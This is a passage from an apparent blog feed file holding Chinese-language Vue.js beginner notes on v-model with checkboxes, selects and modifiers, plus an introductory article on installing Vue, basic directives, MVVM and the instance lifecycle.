class="name">h2</span>&gt;</span>你选择的水果是&#123;&#123;fruits&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../node_modules/vue/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">  el: <span class="string">"#app"</span>,</span></span><br><span class="line">  data: &#123;</span><br><span class="line"><span class="actionscript">    isAgree: <span class="literal">false</span>,</span></span><br><span class="line">    fruits: []</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="结合select使用"><a href="#结合select使用" class="headerlink" title="结合select使用"></a>结合select使用</h2><ol><li>单选<ul><li>v-model绑定的是一个值。</li><li>当我们选中option中的一个时，<strong>会将它对应的value赋值到mySelect中</strong></li><li>注意定义的位置</li></ul></li><li>多选<ul><li>v-model绑定的是一个数组。</li><li>当选中多个值时，就会将选中的option对应的value添加到数组mySelects中</li></ul></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 单选 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">select</span> <span class="attr">v-model</span>=<span class="string">"fruit"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"苹果"</span>&gt;</span>苹果<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"梨子"</span>&gt;</span>梨子<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"西瓜"</span>&gt;</span>西瓜<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"香蕉"</span>&gt;</span>香蕉<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"桃子"</span>&gt;</span>桃子<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"哈密瓜"</span>&gt;</span>哈密瓜<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h5</span> <span class="attr">id</span>=<span class="string">"a"</span>&gt;</span>你选择的水果是&#123;&#123;fruit&#125;&#125;<span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 多选 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">select</span> <span class="attr">v-model</span>=<span class="string">"fruits"</span> <span class="attr">multiple</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"苹果"</span>&gt;</span>苹果<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"梨子"</span>&gt;</span>梨子<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"西瓜"</span>&gt;</span>西瓜<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"香蕉"</span>&gt;</span>香蕉<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"桃子"</span>&gt;</span>桃子<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"哈密瓜"</span>&gt;</span>哈密瓜<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h5</span> <span class="attr">id</span>=<span class="string">"b"</span>&gt;</span>你选择的水果是&#123;&#123;fruits&#125;&#125;<span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../node_modules/vue/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">  el: <span class="string">"#app"</span>,</span></span><br><span class="line">  data: &#123;</span><br><span class="line"><span class="actionscript">    fruit: <span class="string">'香蕉'</span>,</span></span><br><span class="line">    fruits: []</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="值绑定"><a href="#值绑定" class="headerlink" title="值绑定"></a><strong>值绑定</strong></h2><p>根据已有数据去渲染页面的同时，动态绑定这些数据</p><p>就是v-bind动态绑定值，同时，使用v-model双向绑定</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">v-for</span>=<span class="string">"item in fruits"</span> <span class="attr">:for</span>=<span class="string">"item"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">:value</span>=<span class="string">"item"</span> <span class="attr">:id</span>=<span class="string">"item"</span> <span class="attr">v-model</span>=<span class="string">"fruits"</span>&gt;</span>&#123;&#123;item&#125;&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h5</span>&gt;</span>你选择了&#123;&#123;fruits&#125;&#125;水果<span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../node_modules/vue/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">  <span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">    el: <span class="string">"#app"</span>,</span></span><br><span class="line">    data: &#123;</span><br><span class="line"><span class="actionscript">      fruits:[<span class="string">'火龙果'</span>,<span class="string">'橙子'</span>,<span class="string">'香蕉'</span>,<span class="string">'西瓜'</span>,<span class="string">'栗子'</span>,<span class="string">'苹果'</span>]</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="v-model修饰符"><a href="#v-model修饰符" class="headerlink" title="v-model修饰符"></a>v-model修饰符</h2><ol><li><p>lazy修饰符：</p><ul><li>默认情况下，v-model默认是在input事件中同步输入框的数据的。</li><li>一旦有数据发生改变对应的data中的数据就会自动发生改变。</li><li>lazy修饰符可以让数据在失去焦点或者回车时才会更新：</li></ul></li><li><p>number修饰符：</p><ul><li>默认情况下，在输入框中无论我们输入的是字母还是数字，都会被当做字符串类型进行处理。</li><li>但是如果我们希望处理的是数字类型，这个就可以直接将内容当做数字处理。</li><li>number修饰符可以让在输入框中输入的内容自动转成数字类型：</li></ul></li><li><p>trim修饰符：</p><ul><li>如果输入的内容首尾有很多空格，通常我们希望将其去除</li><li>trim修饰符可以过滤内容左右两边的空格</li></ul></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 1.lazy:失去焦点或回车才会实现加载更新 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">v-model.lazy</span>=<span class="string">"message"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 2.number:当只需要数值型数据时使用该修饰符,当没有定义时除了初始值是数字外都会变成字符串类型 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"number"</span> <span class="attr">v-model.number</span>=<span class="string">"num"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;typeof num&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 3.trim:去除输入的空格（页面显示是不会显示空格的，但在具体数据上会显示空格）--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">v-model.trim</span>=<span class="string">"hi"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;hi&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../node_modules/vue/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">  el: <span class="string">"#app"</span>,</span></span><br><span class="line">  data: &#123;</span><br><span class="line"><span class="actionscript">    message: <span class="string">"你好啊"</span>,</span></span><br><span class="line">    num: 16,</span><br><span class="line"><span class="actionscript">    hi: <span class="string">"hhhhh"</span></span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
            <tag> Vue入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一、Vue初识</title>
      <link href="/2021/03/01/%E4%B8%80%E3%80%81Vue%E5%88%9D%E8%AF%86/"/>
      <url>/2021/03/01/%E4%B8%80%E3%80%81Vue%E5%88%9D%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<p>本文章是基于<a href="https://www.bilibili.com/video/BV15741177Eh?p=1" target="_blank" rel="noopener">B站coderwhy</a>学习记录的笔记，自己整理分出来总共有10大节，主要包括了Vue基础知识、<a href="https://ypigy.gitee.io/2021/03/01/%E4%BA%8C%E3%80%81Vue%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/" target="_blank" rel="noopener">基础语法</a>、<a href="https://ypigy.gitee.io/2021/03/01/%E4%B8%89%E3%80%81Vue%E7%BB%84%E4%BB%B6%E5%8C%96%E5%BC%80%E5%8F%91/" target="_blank" rel="noopener">组件化开发</a>、<a href="https://ypigy.gitee.io/2021/03/01/%E5%89%8D%E7%AB%AF%E6%A8%A1%E5%9D%97%E5%8C%96/" target="_blank" rel="noopener">前端模块化</a>、<a href="https://ypigy.gitee.io/2021/03/01/%E5%9B%9B%E3%80%81webpack%E5%85%A5%E9%97%A8/" target="_blank" rel="noopener">webpack的入门</a>、<a href="https://ypigy.gitee.io/2021/03/01/%E4%BA%94%E3%80%81Vue-CLI%E5%85%A5%E9%97%A8/" target="_blank" rel="noopener">Vue-CLI</a>、<a href="https://ypigy.gitee.io/2021/03/01/%E5%85%AD%E3%80%81Vue%20Router%E5%85%A5%E9%97%A8/" target="_blank" rel="noopener">Vue Router</a>、<a href="https://ypigy.gitee.io/2021/03/01/%E4%B8%83%E3%80%81Vuex%E5%85%A5%E9%97%A8/" target="_blank" rel="noopener">Vuex</a>、<a href="https://ypigy.gitee.io/2021/03/01/%E5%85%AB%E3%80%81axios%E5%85%A5%E9%97%A8/" target="_blank" rel="noopener">Axios</a>的学习，最后一节主要记录了关于Vue开发的其他知识（放在思维导图里了），整套入门<a href="https://ypigy.gitee.io/tags/Vue%E5%85%A5%E9%97%A8/" target="_blank" rel="noopener">地址</a></p><p>配套的<a href="https://www.processon.com/view/link/605449a8e0b34d3eef2a9ba4" target="_blank" rel="noopener">思维导图</a>，可以搭配着看</p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>官网<a href="https://cn.vuejs.org/v2/guide/" target="_blank" rel="noopener">简介</a>：Vue (读音 /vjuː/，类似于 <strong>view</strong>) 是一套用于构建用户界面的<strong>渐进式框架</strong>。与其它大型框架不同的是，Vue 被设计为可以自底向上逐层应用。Vue 的核心库只关注视图层，不仅易于上手，还便于与第三方库或既有项目整合。另一方面，当与<a href="https://cn.vuejs.org/v2/guide/single-file-components.html" target="_blank" rel="noopener">现代化的工具链</a>以及各种<a href="https://github.com/vuejs/awesome-vue#libraries--plugins" target="_blank" rel="noopener">支持类库</a>结合使用时，Vue 也完全能够为复杂的单页应用提供驱动。</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>安装一共有三种方式</p><ol><li><p>直接从cdn引用</p><ul><li><p>开发版</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue/dist/vue.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>生产环境版</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue@2.6.11"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>通过下载引用</p><p>官方GitHub<a href="https://github.com/vuejs/vue" target="_blank" rel="noopener">下载地址</a>，这里要注意，你点进去显示的分支是dev的，这个是<strong>开发版本</strong>，下载这个并使用的话可能会出现一些bug，我们需要切换到稳定版，然后下载最新的包之后，clone，下载解压后找到<code>vue.min.js</code>并引入到自己的项目下即可</p><p><img src= "/img/loading.gif" data-src="/2021/03/01/%E4%B8%80%E3%80%81Vue%E5%88%9D%E8%AF%86/image-20200909075300436.png" alt="image-20200909075300436"></p></li><li><p>npm下载使用（推荐）</p><p>如果没有npm基础知识的话，可以沿用上面两种，如果有过这方面的基础，还是建议直接npm下载并引用，命令行下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i --save vue</span><br></pre></td></tr></table></figure></li></ol><h1 id="初体验"><a href="#初体验" class="headerlink" title="初体验"></a>初体验</h1><h2 id="hello-vue"><a href="#hello-vue" class="headerlink" title="hello vue"></a>hello vue</h2><ol><li>引入该框架</li><li>实例化Vue对象</li><li>绑定dom节点</li><li>赋值（这个和之前学得art-template有些类似）</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"hello"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../node_modules/vue/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">    el: <span class="string">'.hello'</span>,</span></span><br><span class="line">    data: &#123;</span><br><span class="line"><span class="actionscript">        message: <span class="string">"hello Vue"</span></span></span><br><span class="line">    &#125;,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="列表展示"><a href="#列表展示" class="headerlink" title="列表展示"></a>列表展示</h2><ul><li>这里用到v-for进行数据循环</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- vue for循环 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">"item in fruits"</span>&gt;</span>&#123;&#123;item&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../node_modules/vue/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">    el: <span class="string">'#app'</span>,</span></span><br><span class="line">    data: &#123;</span><br><span class="line"><span class="actionscript">        title: <span class="string">'你好啊'</span>,</span></span><br><span class="line"><span class="actionscript">        fruits: [<span class="string">'apple'</span>, <span class="string">'orange'</span>, <span class="string">'banana'</span>, <span class="string">'watermelon'</span>]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="运算器"><a href="#运算器" class="headerlink" title="运算器"></a>运算器</h2><p>分别有三种方式来为button控件添加点击事件（注释有详细说明）</p><p>这里的<code>this.num</code>(获取变量名)涉及到proxy代理的问题，后面会补充这一部分</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>当前数量为&#123;&#123;num&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 第一种方式，不提倡，和css的样式定义差不多，如果函数体内方法较少则可以使用 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;button v-on:click="num++"&gt;+&lt;/button&gt; --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;button v-on:click="num--"&gt;-&lt;/button&gt; --&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 第二种方式，在script中书写js代码 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">v-on:click</span>=<span class="string">'add'</span>&gt;</span>+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">v-on:click</span>=<span class="string">'sub'</span>&gt;</span>-<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 第三种语法糖简写格式 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;button @click="add"&gt;&lt;/button&gt; --&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../node_modules/vue/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">    el: <span class="string">'#app'</span>,</span></span><br><span class="line">    data: &#123;</span><br><span class="line">        num: 0,</span><br><span class="line">    &#125;,</span><br><span class="line">    methods: &#123;</span><br><span class="line"><span class="actionscript">        add() &#123; <span class="keyword">this</span>.num++ &#125;, <span class="comment">//这里获取变量名涉及到响应式的问题，proxy代理，后面会补充这一部分知识</span></span></span><br><span class="line"><span class="actionscript">        sub: <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123; <span class="keyword">this</span>.num--&#125;,</span></span><br><span class="line">    &#125;,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="Vue中的MVVM"><a href="#Vue中的MVVM" class="headerlink" title="Vue中的MVVM"></a>Vue中的MVVM</h1><p>什么是mvvm，这里有一篇<a href="https://www.liaoxuefeng.com/wiki/1022910821149312/1108898947791072" target="_blank" rel="noopener">文章</a>值得去看，而vue中的mvvm，可以通过下面这张图理解</p><p><img src= "/img/loading.gif" data-src="/2021/03/01/%E4%B8%80%E3%80%81Vue%E5%88%9D%E8%AF%86/mvvm.png" alt="mvvm"></p><p>nView层（视图层）</p><ul><li><p>在我们前端开发中，通常就是DOM层。</p></li><li><p>主要的作用是给用户展示各种信息。</p></li></ul><p>nModel层（数据层）</p><ul><li>数据可能是我们固定的数据，更多的是来自服务器或从网络上请求下来的数据。</li></ul><p>nVueModel层（视图模型层）</p><ul><li><p>视图模型层是View和Model沟通的桥梁。</p></li><li><p>一方面它实现了Data Binding，也就是数据绑定，将Model的改变实时的反应到View中</p></li><li><p>另一方面它实现了DOM Listener，也就是DOM监听，当DOM发生一些事件(点击、滚动、touch等)时，可以监听到，并在需要的情况下改变对应的Data。</p></li></ul><h1 id="options"><a href="#options" class="headerlink" title="options"></a>options</h1><p>options中包含很多个对象，可以点<a href="https://cn.vuejs.org/v2/api/#%E9%80%89%E9%A1%B9-%E6%95%B0%E6%8D%AE" target="_blank" rel="noopener">这里</a>看官网的相关说明</p><p><strong>el:</strong> </p><ul><li><p>类型：string | HTMLElement</p></li><li><p>作用：决定之后Vue实例会管理哪一个DOM。</p></li></ul><p><strong>data:</strong> </p><ul><li><p>类型：Object | Function （组件当中data必须是一个函数）</p></li><li><p>作用：Vue实例对应的数据对象。</p></li></ul><p><strong>methods:</strong> </p><ul><li><p>类型：{ [key: string]: Function }</p></li><li><p>作用：定义属于Vue的一些方法，可以在其他地方调用，也可以在指令中使用。</p></li></ul><h1 id="vue的生命周期"><a href="#vue的生命周期" class="headerlink" title="vue的生命周期"></a>vue的生命周期</h1><h2 id="生命周期钩子"><a href="#生命周期钩子" class="headerlink" title="生命周期钩子"></a>生命周期钩子</h2><p>每个 Vue 实例在被创建时都要经过一系列的初始化过程——例如，需要设置数据监听、编译模板、将实例挂载到 DOM 并在数据变化时更新 DOM 等。同时在这个过程中也会运行一些叫做<strong>生命周期钩子</strong>的函数，这给了用户在不同阶段添加自己的代码的机会</p><h2 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h2><p>官网的图展示了vue的生命周期</p><p><img src= "/img/loading.gif" data-src="/2021/03/01/%E4%B8%80%E3%80%81Vue%E5%88%9D%E8%AF%86/lifecycle.png" alt="lifecycle"></p>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
            <tag> Vue入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>postGIS安装以及和各主流GIS软件的连接测试</title>
      <link href="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/"/>
      <url>/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/</url>
      
